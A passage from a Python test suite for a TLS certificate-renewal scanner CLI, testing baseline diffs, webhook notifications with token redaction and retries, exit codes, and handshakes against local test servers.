                elif fmt == 'telegram':
                    self.assertEqual(request['path'], '/bot123456:%s/sendMessage' % self.TOKEN)
                    self.assertEqual(payload['chat_id'], -1001234567890)
                    self.assertIn('9 changes', payload['text'])
                else:
                    self.assertEqual(len(payload['changes']), 9)
                    self.assertEqual(payload['baseline']['file'], self.baseline)

    def test_environment_variable_and_when_to_send(self):
        code, _, err, hook = self.run_cli('--baseline', self.baseline, env=True)
        self.assertEqual((code, len(hook.requests)), (0, 1), err)
        self.assertEqual(hook.payloads()[0]['tool'], 'ssl_origin_scan')  # json: a local URL
        # nothing changed, nothing expiring: no message, unless --notify-always
        same = os.path.join(self.tmp.name, 'same.json')
        Path(same).write_text(sos.render_json(self.after), encoding='utf-8')
        code, _, err, hook = self.run_cli('--baseline', same, '--notify', 'URL', '--warn-days', '5')
        self.assertEqual((code, hook.requests), (0, []), err)
        self.assertNotIn('Notification sent', err)
        code, _, err, hook = self.run_cli('--baseline', same, '--notify', 'URL', '--notify-always')
        self.assertEqual((code, len(hook.requests)), (0, 1), err)
        self.assertIn('no changes since', hook.payloads()[0]['title'])
        # without --baseline / --warn-days / --notify-always there is nothing to send
        code, _, err, hook = self.run_cli('--notify', 'URL')
        self.assertEqual((code, hook.requests), (0, []))
        self.assertIn('--notify sends a message only with --baseline', err)
        # --warn-days alone
        report = scan_report([sos.Server('web', ['10.0.0.1'])],
                             {'10.0.0.1': by_old_or_new(RENEWED_DER)}, now=BEFORE_RSA_EXPIRY)
        code, out, err, hook = self.run_cli('--warn-days', '30', '--notify', 'URL', report=report)
        self.assertEqual((code, len(hook.requests)), (0, 1), err)
        self.assertIn('1 certificate expiring within 30 days', hook.payloads()[0]['title'])
        self.assertIn('Served certificates expiring within 30 days: 1', out)

    def test_retry_once_on_server_errors_and_429(self):
        code, _, err, hook = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                          script=[500, 200])
        self.assertEqual((code, len(hook.requests)), (0, 2), err)
        self.assertIn('Notification sent', err)
        code, _, err, hook = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                          script=[(429, {'Retry-After': '0'}, b'slow down'), 204])
        self.assertEqual((code, len(hook.requests)), (0, 2), err)
        code, _, err, hook = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                          script=[503, 503, 200])
        self.assertEqual((code, len(hook.requests)), (0, 2))  # one retry, not more
        self.assertIn('error: notification failed (json, 127.0.0.1:', err)
        self.assertIn('HTTP 503', err)

    def test_failures_are_reported_redacted_and_keep_the_exit_code(self):
        body = ('no_service for /services/T0/B0/%s' % self.TOKEN).encode('ascii')
        code, out, err, hook = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                            script=[(404, {}, body)])
        self.assertEqual((code, len(hook.requests)), (0, 1))  # a 4xx is not retried
        self.assertIn('HTTP 404 Not Found: no_service for ***', err)
        self.assertIn('Changes since the baseline', out)
        code, _, err, _ = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                       '--fail-on-notify-error', script=[(404, {}, body)])
        self.assertEqual(code, sos.EXIT_NOTIFY_ERROR)
        self.assertEqual(sos.EXIT_NOTIFY_ERROR, 5)
        # a redirect is not followed: the POST would turn into a GET without the message
        code, _, err, hook = self.run_cli('--baseline', self.baseline, '--notify', 'URL',
                                          script=[(302, {'Location': '/elsewhere'}, b'')])
        self.assertEqual([r['method'] for r in hook.requests], ['POST'])
        self.assertIn('HTTP 302 Found (a redirect; not followed)', err)
        # -q hides the success line, never the failure
        code, _, err, _ = self.run_cli('--baseline', self.baseline, '--notify', 'URL', '-q',
                                       script=[(400, {}, b'bad payload')])
        self.assertIn('error: notification failed', err)
        code, _, err, _ = self.run_cli('--baseline', self.baseline, '--notify', 'URL', '-q')
        self.assertEqual(err, '')

    def test_timeouts_and_unreachable_webhooks(self):
        with mock.patch.object(sos, 'NOTIFY_TIMEOUT', 0.3):
            with WebhookReceiver(delay=1.5) as hook, no_proxy(), \
                    mock.patch.object(sos, 'run_scan', return_value=self.after), \
                    mock.patch.object(sos, 'NOTIFY_RETRY_DELAY', 0.01):
                code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline',
                                        self.baseline, '--notify', hook.url('/x/%s' % self.TOKEN),
                                        '--fail-on-notify-error')
                attempts = len(hook.requests)
        self.assertEqual((code, attempts), (sos.EXIT_NOTIFY_ERROR, 2), err)
        self.assertIn('timed out', err)
        self.assertNotIn(self.TOKEN, err)

        class HangUp(_Listener):
            """Accepts and closes: a proxy or a webhook host that drops the request."""

            def handle(self, conn: socket.socket) -> None:
                conn.close()

        hang_up = HangUp()
        try:
            with no_proxy(), mock.patch.object(sos, 'run_scan', return_value=self.after), \
                    mock.patch.object(sos, 'NOTIFY_RETRY_DELAY', 0.01):
                code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline',
                                        self.baseline, '--notify', 'http://127.0.0.1:%d/x/%s'
                                        % (hang_up.port, self.TOKEN))
        finally:
            hang_up.close()
        self.assertEqual(code, 0)
        self.assertEqual(len(hang_up._conns), 2)  # retried once
        self.assertIn('error: notification failed (json, 127.0.0.1:', err)
        self.assertNotIn(self.TOKEN, err)

    def test_error_answers_of_webhook_services(self):
        answers = {
            b'{"ok":false,"error_code":400,"description":"Bad Request: chat not found"}':
                'Bad Request: chat not found',                                  # Telegram
            b'{"message": "Unknown Webhook", "code": 10015}': 'Unknown Webhook',  # Discord
            b'{"error":{"code":"TriggerInputSchemaMismatch","message":"The input body '
            b'for trigger manual of type Request did not match"}}':
                'The input body for trigger manual of type Request did not match',
            b'invalid_payload': 'invalid_payload',                             # Slack
            b'  line one\n\n  line two ': 'line one line two',
            b'{"error": 5}': '{"error": 5}',
            b'': '',
        }
        for raw, want in answers.items():
            self.assertEqual(sos._response_detail(raw), want, raw)
        with WebhookReceiver([(400, {}, b'{"description": "Bad Request: chat not found"}')]) \
                as hook, no_proxy():
            problem = sos.send_notification(hook.url('/bot1:x/sendMessage'), {'text': 'x'})
        self.assertEqual(problem, 'HTTP 400 Bad Request: Bad Request: chat not found')

    def test_send_notification_directly(self):
        with WebhookReceiver([500, 500]) as hook, no_proxy():
            slept = []
            problem = sos.send_notification(hook.url('/hook'), {'text': 'x'}, retries=1,
                                            retry_delay=0.25, sleep=slept.append)
        self.assertIn('HTTP 500', problem)
        self.assertEqual((len(hook.requests), slept), (2, [0.25]))
        with WebhookReceiver([500]) as hook, no_proxy():
            problem = sos.send_notification(hook.url('/hook'), {'text': 'x'}, retries=0)
        self.assertEqual(len(hook.requests), 1)
        self.assertIsNotNone(problem)


class MonitorCliTests(unittest.TestCase):

    def test_baseline_changes_json_and_fail_on_change(self):
        with tempfile.TemporaryDirectory() as tmp:
            base, out_json = os.path.join(tmp, 'base.json'), os.path.join(tmp, 'now.json')
            Path(base).write_text(sos.render_json(fleet_before()), encoding='utf-8')
            with mock.patch.object(sos, 'run_scan', return_value=fleet_after()):
                code, out, err = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', base,
                                          '--json', out_json, '--no-color')
                self.assertEqual(code, 0, err)
                doc = read_json(out_json)
                code, _, _ = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', base,
                                      '--fail-on-change', '-q')
                self.assertEqual(code, sos.EXIT_CHANGED)
                self.assertEqual(sos.EXIT_CHANGED, 4)
                # 4 wins over 1 (NEEDS_UPDATE), 3 (a report not written) over 4
                code, _, _ = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', base,
                                      '--fail-on-change', '--fail-on-needs-update', '-q')
                self.assertEqual(code, sos.EXIT_CHANGED)
                with mock.patch.object(sos, '_write_output',
                                       side_effect=sos.UsageError('cannot write')):
                    code, _, _ = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', base,
                                          '--fail-on-change', '--json', out_json, '-q')
                self.assertEqual(code, sos.EXIT_OUTPUT_ERROR)
            with mock.patch.object(sos, 'run_scan', return_value=fleet_before()):
                code, out2, _ = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', base,
                                         '--fail-on-change', '--fail-on-needs-update', '-q')
            self.assertEqual(code, sos.EXIT_NEEDS_UPDATE)  # nothing changed
            self.assertIn('Changes since the baseline (%s, scan of ' % base, out2)
        self.assertIn('Changes since the baseline', out)
        self.assertEqual(len(doc['changes']), 9)
        self.assertEqual(doc['baseline']['file'], base)
        self.assertFalse(doc['baseline']['missing'])
        self.assertNotIn('expiring', doc)

    def test_same_file_as_baseline_and_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = os.path.join(tmp, 'state.json')
            args = ('-t', '127.0.0.1', '-n', WILD, '--baseline', state, '--json', state,
                    '--fail-on-change', '--no-color')
            with mock.patch.object(sos, 'run_scan', return_value=fleet_before()):
                code, out, err = run_main(*args)
            self.assertEqual(code, 0, err)
            self.assertIn('does not exist yet', out)
            self.assertTrue(read_json(state)['baseline']['missing'])
            with mock.patch.object(sos, 'run_scan', return_value=fleet_after()):
                code, out, _ = run_main(*args)
            self.assertEqual(code, sos.EXIT_CHANGED)
            self.assertEqual(len(read_json(state)['changes']), 9)  # compared with run 1
            with mock.patch.object(sos, 'run_scan', return_value=fleet_after()):
                code, out, _ = run_main(*args)
            self.assertEqual(code, 0)  # compared with run 2: nothing new
            self.assertEqual(read_json(state)['changes'], [])
            # the report is replaced whole or not at all: a write that fails (a full disk)
            # keeps the last baseline, and leaves no temporary file behind
            kept = Path(state).read_bytes()
            with mock.patch.object(sos, 'run_scan', return_value=fleet_before()), \
                    mock.patch.object(sos.os, 'replace',
                                      side_effect=OSError(28, 'No space left on device')):
                code, out, err = run_main(*args)
            self.assertEqual(code, sos.EXIT_OUTPUT_ERROR)
            self.assertIn('cannot write %s: No space left on device' % state, err)
            self.assertIn('Changes since the baseline', out)
            self.assertEqual(Path(state).read_bytes(), kept)
            self.assertEqual(os.listdir(tmp), ['state.json'])
            # another --json file is written in place, as without --baseline
            other = os.path.join(tmp, 'other-report.json')
            with mock.patch.object(sos, 'run_scan', return_value=fleet_before()), \
                    mock.patch.object(sos.os, 'replace', side_effect=AssertionError('in place')):
                code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline', state,
                                        '--json', other, '-q')
            self.assertEqual(code, 0, err)
            self.assertEqual(len(read_json(other)['changes']), 9)
            os.remove(other)
            # a missing baseline that is not also the --json report is an error
            with mock.patch.object(sos, 'run_scan', side_effect=AssertionError('must not scan')):
                code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, '--baseline',
                                        os.path.join(tmp, 'other.json'), '--json', state)
            self.assertEqual(code, 2)
            self.assertIn('does not exist', err)

    def test_usage_errors_stop_before_the_scan(self):
        with tempfile.TemporaryDirectory() as tmp:
            bad = os.path.join(tmp, 'bad.json')
            Path(bad).write_text('{"tool": "something else"}', encoding='utf-8')
            secret = 'SECRETTOKEN0123456789'
            cases = [
                (('--baseline', bad), 'not a --json report'),
                (('--fail-on-change',), '--fail-on-change needs --baseline'),
                (('--baseline', '-'), '--baseline reads a file, not stdin'),
                (('--warn-days', '-1'), '--warn-days must be between 0 and 3650'),
                (('--warn-days', '3651'), '--warn-days must be between 0 and 3650'),
                (('--warn-days', 'soon'), 'invalid int value'),
                (('--notify-always',), 'need --notify URL or DOMAINSCOPE_NOTIFY_URL'),
                (('--fail-on-notify-error',), 'need --notify URL'),
                (('--notify-format', 'slack'), 'need --notify URL'),
                (('--notify-format', 'irc', '--notify', 'https://example.com/x'), 'invalid choice'),
                (('--notify', 'ftp://example.com/%s' % secret), '--notify: needs an http://'),
                (('--notify', 'https://api.telegram.org/bot1:%s/sendMessage' % secret),
                 'Telegram URL looks like'),
            ]
            for args, needle in cases:
                with self.subTest(args=args):
                    with mock.patch.object(sos, 'run_scan',
                                           side_effect=AssertionError('must not scan')), \
                            mock.patch.dict(os.environ, {sos.NOTIFY_ENV: ''}):
                        code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, *args)
                    self.assertEqual(code, 2)
                    self.assertIn(needle, err)
                    self.assertNotIn(secret, err)
                    self.assertNotIn('Traceback', err)
            with mock.patch.object(sos, 'run_scan', side_effect=AssertionError('must not scan')), \
                    mock.patch.dict(os.environ, {sos.NOTIFY_ENV: 'gopher://x/%s' % secret}):
                code, _, err = run_main('-t', '127.0.0.1', '-n', WILD)
            self.assertEqual(code, 2)
            self.assertIn('DOMAINSCOPE_NOTIFY_URL: needs an http://', err)
            self.assertNotIn(secret, err)

    def test_plain_http_to_another_host_is_a_warning(self):
        with mock.patch.object(sos, 'run_scan', return_value=fleet_before()), \
                mock.patch.object(sos, 'send_notification', return_value=None) as send:
            code, _, err = run_main('-t', '127.0.0.1', '-n', WILD, '--notify',
                                    'http://example.com/hook', '--notify-always')
        self.assertEqual(code, 0)
        self.assertIn('--notify uses http:// to another host', err)
        self.assertEqual(send.call_count, 1)
        self.assertEqual(send.call_args[0][0], 'http://example.com/hook')

    def test_documented_commands_parse(self):
        """The About page's examples and the --help examples are valid command lines."""
        about = (ROOT / 'assets' / 'js' / 'views' / 'about.js').read_text(encoding='utf-8')
        commands = re.findall(r"cmd: '(python3 ssl_origin_scan\.py [^']+)'", about)
        self.assertGreaterEqual(len(commands), 6)
        self.assertTrue(any('--baseline last.json --json last.json' in c for c in commands))
        epilog = sos.EPILOG.replace('\\\n', ' ')
        helped = re.findall(r'^ +(python3 ssl_origin_scan\.py .+)$', epilog, re.M)
        self.assertGreaterEqual(len(helped), 8)
        parser = sos.build_parser()
        for command in commands + helped:
            with self.subTest(command=command):
                with contextlib.redirect_stderr(io.StringIO()) as err:
                    try:
                        parser.parse_args(shlex.split(command)[2:])
                    except SystemExit:
                        self.fail('%s: %s' % (command, err.getvalue()))

    def test_help_documents_monitoring(self):
        code, out, _ = run_main('--help')
        self.assertEqual(code, 0)
        for needle in ('--baseline FILE', '--warn-days N', '--notify URL', 'DOMAINSCOPE_NOTIFY_URL',
                       '--fail-on-change', '4 something changed', '5 the --notify message',
                       'When several apply: 3, then 5, then 4, then 1', 'Telegram',
                       'Logic Apps workflows', 'Cron ile izleme'):
            self.assertIn(needle, out)


# ===================================================================== integration

def _server_context(fixture: str) -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(str(FIXTURES / (fixture + '.pem')), str(FIXTURES / (fixture + '.key')))
    return context


class _Listener:
    """Base: accept loop on its own thread; subclasses implement ``handle(conn)``."""

    def __init__(self, host: str = '127.0.0.1', port: int = 0) -> None:
        family = socket.AF_INET6 if ':' in host else socket.AF_INET
        self.sock = socket.socket(family, socket.SOCK_STREAM)
        self.sock.bind((host, port))
        self.sock.listen(128)
        self.sock.settimeout(0.2)
        self.port = self.sock.getsockname()[1]
        self._stop = threading.Event()
        self._conns = []  # type: List[socket.socket]
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self) -> None:
        while not self._stop.is_set():
            try:
                conn, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            conn.settimeout(5)
            self._conns.append(conn)
            threading.Thread(target=self._safe_handle, args=(conn,), daemon=True).start()

    def _safe_handle(self, conn: socket.socket) -> None:
        try:
            self.handle(conn)
        except (OSError, ssl.SSLError, ValueError):
            pass  # phase-1 port checks connect and hang up immediately

    def handle(self, conn: socket.socket) -> None:
        raise NotImplementedError

    def close(self) -> None:
        self._stop.set()
        self.sock.close()
        for conn in self._conns:
            try:
                conn.close()
            except OSError:
                pass
        self._thread.join(2)


class TlsServer(_Listener):
    """TLS server choosing a fixture certificate by SNI suffix (``sni_callback``)."""

    def __init__(self, default: str, rules: Sequence[Tuple[str, str]] = (),
                 reject_unknown: bool = False, host: str = '127.0.0.1', port: int = 0,
                 alert: int = ssl.ALERT_DESCRIPTION_UNRECOGNIZED_NAME,
                 require_sni: bool = False) -> None:
        self.context = _server_context(default)
        self.rules = [(suffix, _server_context(name)) for suffix, name in rules]
        self.reject_unknown = reject_unknown
        self.alert = alert
        self.require_sni = require_sni
        self.seen = []  # type: List[Optional[str]]
        self.context.sni_callback = self._on_sni
        super().__init__(host, port)

    def _on_sni(self, sslobj, server_name, _context):
        self.seen.append(server_name)
        if not server_name:
            return self.alert if self.require_sni else None
        for suffix, context in self.rules:
            if server_name == suffix or server_name.endswith('.' + suffix):
                sslobj.context = context
                return None
        return self.alert if self.reject_unknown else None

    def handle(self, conn: socket.socket) -> None:
        with self.context.wrap_socket(conn, server_side=True):
            pass


class LimitedTlsServer(TlsServer):
    """Hangs up on every connection beyond ``limit`` open ones (a per-client limiter)."""

    def __init__(self, *args, limit: int = 2, **kwargs) -> None:
        self.limit = limit
        self.active = 0
        self.dropped = 0
        self.lock = threading.Lock()
        super().__init__(*args, **kwargs)

    def handle(self, conn: socket.socket) -> None:
        with self.lock:
            self.active += 1
            over = self.active > self.limit
            self.dropped += over
        try:
            if over:
                conn.close()
                return
            time.sleep(0.05)  # a slow backend: concurrent handshakes overlap
            super().handle(conn)
        finally:
            with self.lock:
                self.active -= 1


class PlainServer(_Listener):
    """Speaks HTTP, not TLS -> the client handshake fails (TLS_ERROR)."""

    def handle(self, conn: socket.socket) -> None:
        conn.recv(4096)
        conn.sendall(b'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n')
        conn.close()


class SilentServer(_Listener):
    """Accepts and never answers -> handshake TIMEOUT."""

    def handle(self, conn: socket.socket) -> None:
        self._stop.wait(30)


def _free_port() -> int:
    sock = socket.socket()
    sock.bind(('127.0.0.1', 0))
    port = sock.getsockname()[1]
    sock.close()
    return port


WILD_OLD = [('example-test.com.tr', 'rsa_multi_san'), ('wild.example.net', 'ec_wildcard')]
WILD_NEW = [('example-test.com.tr', 'rsa_multi_san'), ('wild.example.net', 'cli_renewed_wild')]


class IntegrationTests(unittest.TestCase):
    """Real TLS handshakes against local servers (default cert = cn_only)."""

    @classmethod
    def setUpClass(cls):
        cls.old = TlsServer('cn_only', WILD_OLD)
        cls.new = TlsServer('cn_only', WILD_NEW)
        cls.partial = TlsServer('ec_wildcard', WILD_NEW)          # old cert as default
        cls.strict = TlsServer('cn_only', WILD_OLD, reject_unknown=True)
        cls.plain = PlainServer()
        cls.silent = SilentServer()
        cls.closed_port = _free_port()
        cls.tmp = tempfile.TemporaryDirectory()
        cls.renewed = str(FIXTURES / 'cli_renewed_wild.pem')

    @classmethod
    def tearDownClass(cls):
        for server in (cls.old, cls.new, cls.partial, cls.strict, cls.plain, cls.silent):
            server.close()
        cls.tmp.cleanup()

    def path(self, name: str) -> str:
        return os.path.join(self.tmp.name, name)

    @staticmethod
    def index(doc) -> Dict[Tuple[int, Optional[str]], Dict]:
        return {(row['port'], row['name'] if row['probe'] != 'default' else '(default)'): row
                for row in doc['results']}

    def test_needs_update_updated_not_hosted_closed(self):
        json_path, csv_path = self.path('a.json'), self.path('a.csv')
        ports = '%d,%d,%d' % (self.old.port, self.new.port, self.closed_port)
        code, out, err = run_main(
            '-t', '127.0.0.1', '-p', ports, '--timeout', '4', '-w', '16',
            '-n', 'a.wild.example.net', 'www.example-test.com.tr', 'nothere.example.com',
            '--cert', self.renewed, '--json', json_path, '--csv', csv_path)
        self.assertEqual(code, 0, err)
        doc = read_json(json_path)
        rows = self.index(doc)
        old, new, closed = self.old.port, self.new.port, self.closed_port

        self.assertEqual(rows[(old, 'a.wild.example.net')]['status'], 'NEEDS_UPDATE')
        self.assertEqual(rows[(old, 'a.wild.example.net')]['coveredBy'], '*.wild.example.net')
        self.assertEqual(rows[(old, 'a.wild.example.net')]['certSha256'],
                         EXPECTED['ec_wildcard.pem']['sha256'])
        self.assertEqual(rows[(old, '*.wild.example.net')]['status'], 'NEEDS_UPDATE')
        self.assertEqual(rows[(old, 'wild.example.net')]['status'], 'NEEDS_UPDATE')
        self.assertEqual(rows[(old, 'nothere.example.com')]['status'], 'NOT_HOSTED')
        self.assertEqual(rows[(old, 'nothere.example.com')]['certSubjectCN'],
                         'legacy.example.org')
        self.assertEqual(rows[(old, '(default)')]['status'], 'NOT_HOSTED')

        for name in ('a.wild.example.net', '*.wild.example.net', 'wild.example.net'):
            self.assertEqual(rows[(new, name)]['status'], 'UPDATED', name)
            self.assertEqual(rows[(new, name)]['certSha256'], RENEWED_WILD_SHA256)
        self.assertEqual(rows[(new, 'www.example-test.com.tr')]['status'], 'NEEDS_UPDATE')
        self.assertIs(rows[(new, 'www.example-test.com.tr')]['newCertCovers'], False)
        self.assertEqual(rows[(closed, None)]['status'], 'CLOSED')
        self.assertEqual(rows[(closed, None)]['probe'], 'connect')
        self.assertTrue(rows[(new, 'a.wild.example.net')]['tlsVersion'].startswith('TLS'))

        # the synthetic wildcard SNI really reached the server
        self.assertIn('ssl-origin-scan-wildcard-probe.wild.example.net', self.old.seen)
        self.assertIn(None, self.old.seen)  # the no-SNI probe

        with open(csv_path, encoding='utf-8') as handle:
            self.assertEqual(handle.read(1), '\ufeff')  # BOM for Excel
        with open(csv_path, encoding='utf-8-sig', newline='') as handle:
            records = list(csv.DictReader(handle))
        self.assertEqual(len(records), len(doc['results']))
        self.assertEqual(set(records[0]), set(sos.CSV_COLUMNS))

        self.assertIn('Servers that need the new certificate: 1', out)
        self.assertIn('Results (server/port/name):', out)
        self.assertNotIn('\x1b[', out)  # not a TTY -> no colours
        self.assertIn('JSON report written to', err)
        self.assertIn('not covered by the new certificate: www.example-test.com.tr', err)

    def test_served_cert_passed_as_cert_is_updated(self):
        json_path = self.path('b.json')
        code, _, err = run_main('-t', 'local=127.0.0.1', '-p', str(self.old.port),
                                '--cert', str(FIXTURES / 'rsa_multi_san.pem'),
                                '--json', json_path, '--fail-on-needs-update', '-q')
        self.assertEqual(code, 0, err)
        self.assertEqual(err, '')  # -q
        doc = read_json(json_path)
        rows = self.index(doc)
        port = self.old.port
        for name in ('example-test.com.tr', 'www.example-test.com.tr', 'api.example-test.com.tr',
                     'xn--mnchen-3ya.example-test.com.tr', '*.cdn.example-test.com.tr'):
            self.assertEqual(rows[(port, name)]['status'], 'UPDATED', name)
        # the wildcard's base is probed but is not covered by "*.cdn..." (RFC 6125)
        self.assertEqual(rows[(port, 'cdn.example-test.com.tr')]['status'], 'NOT_HOSTED')
        self.assertEqual(doc['servers'][0]['name'], 'local')
        self.assertEqual(doc['servers'][0]['status'], 'UPDATED')
        self.assertEqual(doc['summary']['serversUpdated'], 1)

    def test_partially_updated_server_via_default_cert(self):
        code, out, err = run_main('-t', '127.0.0.1', '-p', str(self.partial.port),
                                  '-n', 'a.wild.example.net', '--cert', self.renewed,
                                  '--json', '-', '-q')
        self.assertEqual(code, 0, err)
        doc = json.loads(out)  # --json - : only JSON on stdout
        rows = self.index(doc)
        port = self.partial.port
        self.assertEqual(rows[(port, 'a.wild.example.net')]['status'], 'UPDATED')
        self.assertEqual(rows[(port, '(default)')]['status'], 'NEEDS_UPDATE')
        self.assertEqual(doc['servers'][0]['status'], 'NEEDS_UPDATE')
        self.assertTrue(doc['servers'][0]['defaultCertNeedsUpdate'])

    def test_unrecognized_name_alert_is_not_hosted(self):
        code, out, err = run_main('-t', '127.0.0.1', '-p', str(self.strict.port),
                                  '-n', 'nothere.example.com', 'www.example-test.com.tr',
                                  '--csv', '-', '-q')
        self.assertEqual(code, 0, err)
        records = {r['name']: r for r in csv.DictReader(io.StringIO(out))}
        self.assertEqual(records['nothere.example.com']['status'], 'NOT_HOSTED')
        self.assertIn('unrecognized_name', records['nothere.example.com']['error'])
        self.assertEqual(records['www.example-test.com.tr']['status'], 'NEEDS_UPDATE')
        self.assertEqual(records['']['status'], 'NOT_HOSTED')  # no-SNI probe: default cert

    def test_cloudflare_style_handshake_failure_alert(self):
        server = TlsServer('cn_only', WILD_OLD, reject_unknown=True, require_sni=True,
                           alert=ssl.ALERT_DESCRIPTION_HANDSHAKE_FAILURE)
        try:
            code, out, err = run_main('-t', 'edge=127.0.0.1', '-p', str(server.port),
                                      '-n', 'www.example-test.com.tr', 'nothere.example.com',
                                      '--json', '-', '-q')
        finally:
            server.close()
        self.assertEqual(code, 0, err)
        rows = self.index(json.loads(out))
        port = server.port
        self.assertEqual(rows[(port, 'www.example-test.com.tr')]['status'], 'NEEDS_UPDATE')
        self.assertEqual(rows[(port, 'nothere.example.com')]['status'], 'NOT_HOSTED')
        self.assertIn('server refused this name', rows[(port, 'nothere.example.com')]['error'])
        self.assertIn('HANDSHAKE_FAILURE', rows[(port, 'nothere.example.com')]['error'])
        self.assertEqual(rows[(port, '(default)')]['status'], 'NOT_HOSTED')
        self.assertIn('server requires SNI', rows[(port, '(default)')]['error'])

    def test_connection_limiter_does_not_turn_hosted_names_into_not_hosted(self):
        server = LimitedTlsServer('cn_only', WILD_OLD, limit=2)
        names = ['h%02d.wild.example.net' % i for i in range(30)]
        try:
            # --strict-public: the served certificate is self-signed (else PRIVATE_CERT)
            code, out, err = run_main('-t', 'web=127.0.0.1', '-p', str(server.port),
                                      '-n', *names, '--timeout', '5', '--json', '-', '-q',
                                      '--strict-public')
        finally:
            server.close()
        self.assertEqual(code, 0, err)
        self.assertGreater(server.dropped, 0)  # the limiter really cut connections
        doc = json.loads(out)
        statuses = {row['name']: row['status'] for row in doc['results'] if row['name']}
        errors = {row['name']: row.get('error') for row in doc['results']
                  if row['name'] and row['status'] != 'NEEDS_UPDATE'}
        self.assertEqual(set(statuses.values()), {'NEEDS_UPDATE'}, errors)
        self.assertEqual(len(doc['servers'][0]['needsUpdate']), 30)

    def test_tls_error_and_handshake_timeout(self):
        json_path = self.path('e.json')
        ports = '%d,%d' % (self.plain.port, self.silent.port)
        code, out, err = run_main('-t', '127.0.0.1', '-p', ports,
                                  '-n', 'a.example.com', '--timeout', '1', '--json', json_path,
                                  '-q')
        self.assertEqual(code, 0, err)
        rows = self.index(read_json(json_path))
        self.assertEqual(rows[(self.plain.port, 'a.example.com')]['status'], 'TLS_ERROR')
        self.assertTrue(rows[(self.plain.port, 'a.example.com')]['error'])
        self.assertEqual(rows[(self.silent.port, 'a.example.com')]['status'], 'TIMEOUT')
        self.assertIn('Handshake errors: 1', out)

    def test_ctrl_c_during_scan_exits_130_quickly(self):
        import _thread
        timer = threading.Timer(0.5, _thread.interrupt_main)  # simulates SIGINT / Ctrl-C
        started = time.monotonic()
        timer.start()
        try:
            code, out, err = run_main('-t', '127.0.0.1', '-p', str(self.silent.port),
                                      '-n', 'a.example.com', '--timeout', '10',
                                      '--json', self.path('never.json'))
        finally:
            timer.cancel()
        elapsed = time.monotonic() - started
        self.assertEqual(code, 130)
        self.assertLess(elapsed, 5)  # did not wait for the 10 s handshake timeout
        self.assertIn('interrupted', err)
        self.assertNotIn('Traceback', err)
        self.assertEqual(out, '')
        self.assertFalse(os.path.exists(self.path('never.json')))

    def test_show_all_lists_not_hosted(self):
        code, out, _ = run_main('-t', 'box=127.0.0.1', '-p', str(self.old.port),
                                '-n', 'nothere.example.com', '-q')
        self.assertEqual(code, 0)
        self.assertIn('1 not hosting any of the names', out)
        self.assertNotIn('legacy.example.org', out)
        code, out, _ = run_main('-t', 'box=127.0.0.1', '-p', str(self.old.port),
                                '-n', 'nothere.example.com', '-q', '--show-all')
        self.assertIn('Not hosting any of the names: 1', out)
        self.assertIn('current: legacy.example.org', out)

    def test_fail_on_needs_update_in_subprocess(self):
        env = dict(os.environ, PYTHONIOENCODING='utf-8', NO_COLOR='1')
        proc = subprocess.run(
            [sys.executable, str(CLI_PATH), '-t', 'web-old=127.0.0.1', '-p', str(self.old.port),
             '-n', 'a.wild.example.net', '--cert', self.renewed, '--fail-on-needs-update'],
            capture_output=True, text=True, encoding='utf-8', env=env, timeout=60)
        self.assertEqual(proc.returncode, 1, proc.stderr)
        self.assertIn('Servers that need the new certificate: 1', proc.stdout)
        self.assertIn('web-old', proc.stdout)
        self.assertNotIn('Traceback', proc.stderr)
        proc = subprocess.run([sys.executable, str(CLI_PATH), '-t', '127.0.0.1'],
                              capture_output=True, text=True, env=env, timeout=60)
        self.assertEqual(proc.returncode, 2)
        self.assertIn('nothing to probe', proc.stderr)

    def test_ipv6_and_server_grouping(self):
        try:
            v6_new = TlsServer('cn_only', WILD_NEW, host='::1', port=self.old.port)
        except OSError as exc:
            self.skipTest('IPv6 loopback not available: %s' % exc)
        try:
            with tempfile.NamedTemporaryFile('w', suffix='.txt', delete=False,
                                             dir=self.tmp.name) as handle:
                handle.write('web-a 127.0.0.1\nweb-b ::1\n')
            code, out, err = run_main('-t', handle.name, '-p', str(self.old.port),
                                      '-n', 'a.wild.example.net', '--cert', self.renewed,
                                      '--json', self.path('v6.json'), '-q')
        finally:
            v6_new.close()
        self.assertEqual(code, 0, err)
        doc = read_json(self.path('v6.json'))
        statuses = {s['name']: s['status'] for s in doc['servers']}
        self.assertEqual(statuses, {'web-a': 'NEEDS_UPDATE', 'web-b': 'UPDATED'})
        self.assertEqual(doc['summary']['serversNeedingUpdate'], 1)
        need = out.index('Servers that need the new certificate: 1')
        updated = out.index('Already serving the new certificate: 1')
        self.assertIn('web-a', out[need:updated])
        self.assertIn('web-b', out[updated:])
        self.assertIn('[::1]:%d' % self.old.port, out)


class MonitorIntegrationTests(unittest.TestCase):
    """A cron job against real TLS servers: one state file, a local webhook."""

    def test_renewal_between_two_runs(self):
        old, new = TlsServer('cn_only', WILD_OLD), TlsServer('cn_only', WILD_NEW)
        try:
            with tempfile.TemporaryDirectory() as tmp, WebhookReceiver() as hook, no_proxy():
                state = os.path.join(tmp, 'state.json')
                args = ('-t', 'web=127.0.0.1', '-n', WILD, '--cert', str(FIXTURES /
                        'cli_renewed_wild.pem'), '--timeout', '4', '--baseline', state,
                        '--json', state, '--fail-on-change', '--warn-days', '30', '--notify',
                        hook.url('/hook'), '--no-color')
                code, out, err = run_main('-p', str(old.port), *args)
